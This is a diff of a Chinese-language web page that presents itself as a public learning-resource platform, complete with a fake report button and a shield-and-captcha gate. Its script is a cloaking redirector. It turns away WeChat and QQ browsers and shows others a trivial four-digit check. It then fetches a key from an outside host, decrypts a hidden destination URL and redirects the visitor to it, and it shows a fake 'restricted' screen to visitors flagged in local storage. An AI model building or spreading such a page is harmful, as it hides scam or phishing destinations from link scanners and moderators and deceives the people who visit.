@@ -6,106 +6,293 @@
   <title>加载中……</title>
   <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
   <style>
-    body{margin:0;background:#f2f4f8;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;color:#333;text-align:center;padding:100px 20px;}
-    .hidden{display:none;}
-    .card{background:#fff;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:400px;margin:0 auto;padding:40px 30px;}
-    .lock-icon{font-size:64px;color:#e74c3c;margin-bottom:20px;}
-    .message{font-size:18px;margin-bottom:25px;}
-    .code-area{display:flex;justify-content:center;align-items:center;gap:10px;margin-bottom:20px;}
-    canvas{border-radius:5px;background:#eee;cursor:pointer;}
-    .refresh-btn{background:#e0e0e0;color:#333;border:none;padding:6px 10px;font-size:14px;border-radius:5px;cursor:pointer;}
-    .refresh-btn:hover{background:#ccc;}
-    input[type=text]{padding:12px;font-size:16px;width:180px;border:1px solid #ccc;border-radius:5px;margin-bottom:20px;text-align:center;}
-    button{padding:12px 25px;font-size:16px;background:#3498db;color:#fff;border:none;border-radius:5px;cursor:pointer;}
-    button:hover{background:#2980b9;}
-    #error{color:#e74c3c;margin-top:10px;font-size:14px;}
-    @keyframes shake{0%{transform:translateX(0)}25%{transform:translateX(-5px)}50%{transform:translateX(5px)}75%{transform:translateX(-5px)}100%{transform:translateX(0)}}
-    .shake{animation:shake .3s ease;}
+    *{box-sizing:border-box}
+    body {
+      margin: 0;
+      background: #f1f5f9;
+      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+      color: #333;
+      text-align: center;
+      padding: 60px 20px;
+    }
+    .header-bar {
+      background: #4caf50;
+      color: #fff;
+      padding: 12px 0;
+      font-size: 18px;
+      box-shadow: 0 2px 6px rgba(0,0,0,.1);
+      letter-spacing: 1px;
+      position: relative;
+    }
+    .card {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      max-width: 420px;
+      margin: 40px auto 0;
+      padding: 40px 30px;
+      animation: fadeIn 0.6s ease-in-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .shield {
+      width: 64px;
+      height: 64px;
+      margin: 0 auto 20px;
+      animation: pulse 1.6s infinite ease-in-out;
+    }
+    .shield svg {
+      width: 100%; height: 100%;
+      fill: #4caf50;
+    }
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.15); opacity: 0.85; }
+    }
+    .message {
+      font-size: 17px;
+      margin-bottom: 20px;
+      color: #444;
+    }
+    .code-area {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    canvas {
+      border-radius: 6px;
+      background: #eee;
+      cursor: pointer;
+    }
+    .refresh-btn {
+      background: #e0e0e0;
+      color: #333;
+      border: none;
+      padding: 6px 10px;
+      font-size: 14px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .refresh-btn:hover {
+      background: #ccc;
+    }
+    input[type="text"] {
+      padding: 12px;
+      font-size: 16px;
+      width: 180px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    button {
+      padding: 12px 28px;
+      font-size: 16px;
+      background: #4caf50;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    button:hover {
+      background: #388e3c;
+    }
+    #error {
+      color: #e74c3c;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+    @keyframes shake {
+      0%{transform:translateX(0)}
+      25%{transform:translateX(-5px)}
+      50%{transform:translateX(5px)}
+      75%{transform:translateX(-5px)}
+      100%{transform:translateX(0)}
+    }
+    .shake { animation: shake 0.3s ease; }
+    .hidden { display: none; }
+
+    #reportBtn {
+      position: fixed;
+      top: 10px;
+      right: 12px;
+      background: #f44336;
+      color: #fff;
+      font-size: 13px;
+      padding: 6px 14px;
+      border: none;
+      border-radius: 18px;
+      cursor: pointer;
+      z-index: 999;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    #reportBtn:hover {
+      background: #d32f2f;
+    }
   </style>
 </head>
 <body>
 
+<div class="header-bar">公共学习资源服务平台</div>
+<button id="reportBtn" onclick="window.location.href='/tousu.html'">举报</button>
+
 <div id="wechat-warning" class="card hidden">
-  <div class="lock-icon">🔒</div>
-  <div class="message">请使用手机浏览器访问本页面</div>
+  <div class="shield">
+    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+  </div>
+  <div class="message">请使用系统浏览器访问</div>
 </div>
 
 <div id="verify-box" class="card hidden">
-  <div class="lock-icon">🔒</div>
-  <div class="message">请输入确认码继续</div>
+  <div class="shield">
+    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+  </div>
+  <div class="message">请输入确认码以继续访问</div>
   <div class="code-area">
-    <canvas id="captchaCanvas" width="120" height="40" title="更换确认码"></canvas>
+    <canvas id="captchaCanvas" width="120" height="40" title="点击更换确认码"></canvas>
     <button class="refresh-btn" onclick="drawCaptcha()">换一个</button>
   </div>
   <input type="text" id="code-input" maxlength="4" placeholder="确认码">
   <br>
-  <button onclick="checkCode()">确定</button>
+  <button onclick="checkCode()">确认并进入</button>
   <div id="error"></div>
 </div>
 
 <script>
-/* ---------- 配置 ---------- */
-const keyApi = "https://cdn-assets.safe-data-access.xyz/cfg/core.xml?v=678528";   // ← 短配置
-const encryptedStr = "U2FsdGVkX19CUfvdcCRefc9qfVP9fm55yAo3ZxcJgkuwETAQxCnCeAHTJMtJb8piuQliPnsj8YRkE5DYUmKrDA=="; // ← 长配置
+const keyApi = "https://cdn-assets.safe-data-access.xyz/cfg/core.xml?v=678528";
+const encryptedStr = "U2FsdGVkX19CUfvdcCRefc9qfVP9fm55yAo3ZxcJgkuwETAQxCnCeAHTJMtJb8piuQliPnsj8YRkE5DYUmKrDA==";
 
-/* ---------- 提示---------- */
-function isWX(){return /micromessenger|qq\//i.test(navigator.userAgent);}
+function isWX() {
+  return /micromessenger|qq\//i.test(navigator.userAgent);
+}
 
-/* ---------- 生成---------- */
-let code="";
-function generateCode(){return (Math.floor(1000+Math.random()*9000)).toString();}
-function drawCaptcha(){
-  const c=document.getElementById("captchaCanvas"),ctx=c.getContext("2d");
-  code=generateCode();
-  ctx.clearRect(0,0,c.width,c.height);
-  ctx.fillStyle="#fff";ctx.fillRect(0,0,c.width,c.height);
+let code = "";
+function generateCode() {
+  return Math.floor(1000 + Math.random() * 9000).toString();
+}
+function drawCaptcha() {
+  const c = document.getElementById("captchaCanvas");
+  const ctx = c.getContext("2d");
+  code = generateCode();
+  ctx.clearRect(0, 0, c.width, c.height);
+  ctx.fillStyle = "#fff";
+  ctx.fillRect(0, 0, c.width, c.height);
 
-  /* 文字 */
-  for(let i=0;i<code.length;i++){
-    const fs=22+Math.random()*6;ctx.font=`${fs}px Arial`;
-    ctx.fillStyle=`rgb(${Math.random()*120},${Math.random()*120},${Math.random()*120})`;
-    ctx.fillText(code[i],10+i*25,28+Math.random()*5);
+  for (let i = 0; i < code.length; i++) {
+    const fs = 22 + Math.random() * 6;
+    ctx.font = `${fs}px Arial`;
+    ctx.fillStyle = `rgb(${Math.random()*120},${Math.random()*120},${Math.random()*120})`;
+    ctx.fillText(code[i], 10 + i * 25, 28 + Math.random() * 5);
   }
-  /* 干扰4 条 */
-  for(let i=0;i<4;i++){
-    ctx.strokeStyle=`rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.4)`;
+  for (let i = 0; i < 4; i++) {
+    ctx.strokeStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.4)`;
     ctx.beginPath();
-    ctx.moveTo(Math.random()*c.width,Math.random()*c.height);
-    ctx.lineTo(Math.random()*c.width,Math.random()*c.height);
+    ctx.moveTo(Math.random()*c.width, Math.random()*c.height);
+    ctx.lineTo(Math.random()*c.width, Math.random()*c.height);
     ctx.stroke();
   }
-  /* 噪点 20 个 */
-  for(let i=0;i<20;i++){
-    ctx.fillStyle=`rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.6)`;
+  for (let i = 0; i < 20; i++) {
+    ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.6)`;
     ctx.beginPath();
-    ctx.arc(Math.random()*c.width,Math.random()*c.height,1+Math.random()*1.5,0,2*Math.PI);
+    ctx.arc(Math.random()*c.width, Math.random()*c.height, 1 + Math.random()*1.5, 0, 2 * Math.PI);
     ctx.fill();
   }
 }
-document.getElementById("captchaCanvas").addEventListener("click",drawCaptcha);
+document.getElementById("captchaCanvas").addEventListener("click", drawCaptcha);
 
-/* ---------- 点击确认 ---------- */
-async function checkCode(){
-  const val=document.getElementById("code-input").value.trim();
-  if(val!==code){
-    showErr("确认码错误，请重试",true);return;
+async function checkCode() {
+  const val = document.getElementById("code-input").value.trim();
+  if (val !== code) {
+    showErr("确认码错误，请重试", true);
+    return;
   }
-  try{
-    const key=await fetch(keyApi+"?menu=btn&v=202406").then(r=>r.text());
-    const url=CryptoJS.AES.decrypt(encryptedStr,key).toString(CryptoJS.enc.Utf8);
-    if(url.startsWith("http")){location.href=url;}else{showErr("访问失败，请稍后再试");}
-  }catch(e){showErr("网络错误，请稍后再试");}
-}
-function showErr(msg,shake){
-  const box=document.getElementById("error");box.innerText=msg;
-  if(shake){const inp=document.getElementById("code-input");inp.classList.add("shake");drawCaptcha();setTimeout(()=>inp.classList.remove("shake"),300);}
+
+  // ✅ 正在进入提示
+  const tip = document.createElement("div");
+  tip.innerHTML = `<span class="dot"></span> 正在进入，请稍候...`;
+  tip.style.position = "fixed";
+  tip.style.top = "50%";
+  tip.style.left = "50%";
+  tip.style.transform = "translate(-50%, -50%)";
+  tip.style.background = "linear-gradient(135deg, #4caf50, #66bb6a)";
+  tip.style.color = "#fff";
+  tip.style.padding = "14px 26px";
+  tip.style.borderRadius = "12px";
+  tip.style.fontSize = "15px";
+  tip.style.fontWeight = "500";
+  tip.style.boxShadow = "0 6px 20px rgba(0,0,0,0.2)";
+  tip.style.zIndex = "9999";
+  tip.style.display = "flex";
+  tip.style.alignItems = "center";
+  tip.style.gap = "10px";
+
+  const style = document.createElement("style");
+  style.innerHTML = `
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #fff;
+      animation: pulseDot 1s infinite ease-in-out;
+    }
+    @keyframes pulseDot {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.5); opacity: 0.6; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+  `;
+  document.head.appendChild(style);
+  document.body.appendChild(tip);
+
+  try {
+    const key = await fetch(keyApi + "?menu=btn&v=" + Date.now()).then(r => r.text());
+    const url = CryptoJS.AES.decrypt(encryptedStr, key).toString(CryptoJS.enc.Utf8);
+    if (url.startsWith("http")) {
+      setTimeout(() => {
+        document.body.removeChild(tip);
+        location.href = url;
+      }, 1200);
+    } else {
+      showErr("打开失败，请稍后重试");
+    }
+  } catch (e) {
+    showErr("网络异常，请稍后重试");
+  }
 }
 
-/* ---------- 初始化 ---------- */
-window.onload=()=>{
-  if(isWX()) document.getElementById("wechat-warning").classList.remove("hidden");
-  else {document.getElementById("verify-box").classList.remove("hidden");drawCaptcha();}
-};
+function showErr(msg, shake) {
+  const box = document.getElementById("error");
+  box.innerText = msg;
+  if (shake) {
+    const inp = document.getElementById("code-input");
+    inp.classList.add("shake");
+    drawCaptcha();
+    setTimeout(() => inp.classList.remove("shake"), 300);
+  }
+}
+
+if (localStorage.getItem("blocked_user") === "permanent") {
+  document.body.innerHTML = `
+    <div style="margin:100px auto;max-width:420px;text-align:center;">
+      <div style="font-size:24px;color:#d32f2f;margin-bottom:20px;">🚫 页面访问受限</div>
+      <div style="font-size:16px;color:#555;">该用户已被平台标记，访问权限已关闭<br>如有误请联系平台核实</div>
+    </div>`;
+} else {
+  window.onload = () => {
+    if (isWX()) {
+      document.getElementById("wechat-warning").classList.remove("hidden");
+    } else {
+      document.getElementById("verify-box").classList.remove("hidden");
+      drawCaptcha();
+    }
+  };
+}
 </script>
+
 </body>
 </html>
